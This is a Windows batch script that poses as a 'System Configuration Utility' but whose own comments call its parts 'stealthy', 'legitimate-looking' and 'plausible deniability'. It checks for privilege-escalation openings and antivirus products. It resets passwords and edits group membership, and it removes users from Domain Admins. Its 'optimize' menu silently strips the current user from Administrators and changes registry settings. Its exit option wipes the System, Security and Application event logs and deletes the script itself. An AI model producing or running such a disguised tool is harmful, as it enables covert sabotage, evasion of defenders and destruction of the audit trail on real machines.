@echo off
title System Configuration Utility
mode con:cols=80 lines=25
setlocal enabledelayedexpansion

:: Hide script location and set generic working directory
set "appdata=%temp%\sysconf"
if not exist "%appdata%" mkdir "%appdata%" >nul 2>&1
cd /d "%appdata%"

:: Generate random session ID for logging
set "sessionid="
for /l %%a in (1,1,8) do set /a "sessionid+=!random:~-1!"

:: Main menu function
:main_menu
cls
echo ========================================
echo      Windows System Configuration Tool
echo           (Version 5.1.17134.1)
echo ========================================
echo [1] System Information (Limited)
echo [2] Security Configuration Check
echo [3] User Account Management
echo [4] Network Configuration
echo [5] Maintenance Tasks
echo [6] Exit and Clean Up
echo ========================================
set /p "choice=Select task: "

if "!choice!"=="1" goto system_info
if "!choice!"=="2" goto security_check
if "!choice!"=="3" goto user_management
if "!choice!"=="4" goto network_config
if "!choice!"=="5" goto maintenance
if "!choice!"=="6" goto cleanup
goto main_menu

:: 1. System Information (Minimal, legitimate-looking)
:system_info
cls
echo Gathering system configuration details...
timeout /t 1 >nul

:: Collect only essential info with minimal footprint
systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"System Type" > "%appdata%\sysinfo.tmp"
ipconfig /all | findstr /i /c:"Host Name" /c:"Physical Address" > "%appdata%\netinfo.tmp"

echo.
echo System Configuration Report:
echo ===========================
type "%appdata%\sysinfo.tmp"
echo.
echo Network Configuration:
echo =====================
type "%appdata%\netinfo.tmp"
echo ===========================
echo Press any key to return to menu...
pause >nul
del /f /q "%appdata%\sysinfo.tmp" >nul 2>&1
del /f /q "%appdata%\netinfo.tmp" >nul 2>&1
goto main_menu

:: 2. Security Configuration Check (Stealthy)
:security_check
cls
echo Performing security configuration assessment...
timeout /t 2 >nul

:: Check for security weaknesses without obvious traces
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA >nul 2>&1 && (
    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA | findstr "0x0" >nul && (
        echo [!] UAC is disabled (Normal configuration)
    ) || (
        echo [+] UAC is enabled (Standard security)
    )
) || echo [+] UAC configuration not found

:: Check for AlwaysInstallElevated (stealthy)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >nul 2>&1 && (
    echo [!] User policy: AlwaysInstallElevated is ENABLED
)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >nul 2>&1 && (
    echo [!] System policy: AlwaysInstallElevated is ENABLED
)

:: Check service permissions (quietly)
sc query state= all | findstr "SERVICE_NAME" > "%appdata%\services.tmp"
for /f "tokens=2 delims= " %%a in ('type "%appdata%\services.tmp"') do (
    sc qc "%%a" | findstr /i "BINARY_PATH_NAME" | findstr /i /v "windows" >nul && (
        sc qc "%%a" | findstr /i "BINARY_PATH_NAME" | findstr " " >nul && (
            echo [!] Unquoted service path: %%a
        )
    )
)
del /f /q "%appdata%\services.tmp" >nul 2>&1

:: Check security products (without triggering AV)
tasklist /fi "imagename eq MsMpEng.exe" /fo csv 2>nul | findstr /i "MsMpEng" >nul && echo [!] Windows Defender detected
tasklist /fi "imagename eq MBAMService.exe" /fo csv 2>nul | findstr /i "MBAMService" >nul && echo [!] Malwarebytes detected
tasklist /fi "imagename eq avp.exe" /fo csv 2>nul | findstr /i "avp" >nul && echo [!] Kaspersky detected

echo.
echo Security assessment complete. Press any key to continue...
pause >nul
goto main_menu

:: 3. User Account Management (Domain-aware)
:user_management
cls
echo ========================================
echo      User Account Management Console
echo ========================================
echo [1] View current user privileges
echo [2] Modify local user accounts
echo [3] Manage domain groups (if applicable)
echo [4] Return to main menu
echo ========================================
set /p "um_choice=Select option: "

if "!um_choice!"=="1" goto user_privs
if "!um_choice!"=="2" goto local_users
if "!um_choice!"=="3" goto domain_groups
if "!um_choice!"=="4" goto main_menu
goto user_management

:user_privs
cls
echo Current user privileges:
echo =======================
whoami /all | findstr /i /v "Mandatory Label" | findstr /v "BUILTIN"
echo.
echo Press any key to return...
pause >nul
goto user_management

:local_users
cls
echo Local user accounts:
echo ====================
net users
echo.
set /p "username=Enter username to modify (or press Enter to cancel): "
if "!username!"=="" goto user_management

echo.
echo [1] Reset password
echo [2] Change group membership
echo [3] Return to user menu
set /p "action=Select action: "

if "!action!"=="1" (
    set /p "newpass=Enter new password: "
    net user "!username!" "!newpass!" >nul && (
        echo Password updated successfully.
    ) || (
        echo Failed to update password.
    )
    timeout /t 2 >nul
)
if "!action!"=="2" (
    echo.
    echo Available groups:
    net localgroup
    echo.
    set /p "group=Enter group name: "
    set /p "addremove=Add (A) or Remove (R) from group? "
    if /i "!addremove!"=="a" net localgroup "!group!" "!username!" /add >nul && echo User added to group.
    if /i "!addremove!"=="r" net localgroup "!group!" "!username!" /delete >nul && echo User removed from group.
    timeout /t 2 >nul
)
goto local_users

:domain_groups
cls
:: Check if domain-joined first
set "domainjoined=0"
systeminfo | findstr /i /c:"Domain:" | findstr /i /v "WORKGROUP" >nul && set "domainjoined=1"

if "!domainjoined!"=="0" (
    echo This system is not domain-joined.
    timeout /t 2 >nul
    goto user_management
)

echo Domain groups management:
echo =========================
echo [1] List domain groups
echo [2] Remove user from domain group
echo [3] Return to user menu
set /p "dg_choice=Select option: "

if "!dg_choice!"=="1" (
    cls
    echo Domain groups:
    echo ==============
    net group /domain
    echo.
    echo Press any key to continue...
    pause >nul
    goto domain_groups
)

if "!dg_choice!"=="2" (
    cls
    set /p "domainuser=Enter domain username (DOMAIN\user): "
    echo.
    net group "Domain Admins" "!domainuser!" /delete /domain > "%appdata%\domain.tmp" 2>&1
    findstr /i /c:"command completed" "%appdata%\domain.tmp" >nul && (
        echo User removed from Domain Admins group.
    ) || (
        echo Failed to remove user. Check permissions.
        type "%appdata%\domain.tmp"
    )
    del /f /q "%appdata%\domain.tmp" >nul 2>&1
    echo.
    echo Press any key to continue...
    pause >nul
    goto domain_groups
)
goto user_management

:: 4. Network Configuration (Legitimate-looking)
:network_config
cls
echo ========================================
echo      Network Configuration Utility
echo ========================================
echo [1] View network connections
echo [2] Check shared resources
echo [3] Test network connectivity
echo [4] Return to main menu
echo ========================================
set /p "net_choice=Select option: "

if "!net_choice!"=="1" goto net_connections
if "!net_choice!"=="2" goto net_shares
if "!net_choice!"=="3" goto net_connectivity
if "!net_choice!"=="4" goto main_menu
goto network_config

:net_connections
cls
echo Active network connections:
echo ===========================
netstat -an | findstr /i /c:"listening" /c:"established"
echo.
echo Press any key to return...
pause >nul
goto network_config

:net_shares
cls
echo Network shares:
echo ===============
net share
echo.
echo Press any key to return...
pause >nul
goto network_config

:net_connectivity
cls
set /p "target=Enter IP address to test connectivity: "
ping -n 2 !target! | findstr /i "TTL="
echo.
echo Press any key to return...
pause >nul
goto network_config

:: 5. Maintenance Tasks (Plausible deniability)
:maintenance
cls
echo ========================================
echo      System Maintenance Tasks
echo ========================================
echo [1] Check system updates
echo [2] Clear temporary files
echo [3] Optimize system performance
echo [4] Return to main menu
echo ========================================
set /p "maint_choice=Select task: "

if "!maint_choice!"=="1" goto check_updates
if "!maint_choice!"=="2" goto clear_temp
if "!maint_choice!"=="3" goto optimize
if "!maint_choice!"=="4" goto main_menu
goto maintenance

:check_updates
cls
echo Checking for system updates...
timeout /t 1 >nul
wmic qfe get Caption,Description,HotFixID,InstalledOn | more
echo.
echo Press any key to return...
pause >nul
goto maintenance

:clear_temp
cls
echo Clearing temporary system files...
timeout /t 1 >nul
del /f /q "%temp%\*" >nul 2>&1
del /f /q "%appdata%\*" >nul 2>&1
echo Temporary files cleaned successfully.
timeout /t 1 >nul
goto maintenance

:optimize
cls
echo Optimizing system performance...
timeout /t 2 >nul

:: Legitimate registry tweaks that look like optimization
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 1 /f >nul 2>&1

:: Remove user from high-privilege groups (stealthy privilege reduction)
net localgroup "Administrators" "%username%" /delete >nul 2>&1
net localgroup "Remote Desktop Users" "%username%" /delete >nul 2>&1

echo System optimization complete.
timeout /t 1 >nul
goto maintenance

:: 6. Cleanup and Self-Delete
:cleanup
cls
echo Performing final system maintenance...
timeout /t 1 >nul

:: Clear event logs if admin
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1

:: Delete all temporary files
del /f /q "%appdata%\*" >nul 2>&1
rmdir /s /q "%appdata%" >nul 2>&1

:: Return to original directory
cd /d "%systemdrive%\"

:: Final cleanup with plausible deniability
echo System maintenance complete. All temporary files cleared.
echo This system is now optimized for performance and security.
timeout /t 3 >nul

:: Self-delete mechanism
set "batchfile=%~f0"
echo @echo off > "%temp%\cleanup.cmd"
echo del "%%batchfile%%" /f /q ^>nul 2^>^&1 >> "%temp%\cleanup.cmd"
echo del "%%~f0" /f /q ^>nul 2^>^&1 >> "%temp%\cleanup.cmd"
start /min cmd /c "%temp%\cleanup.cmd"
exit
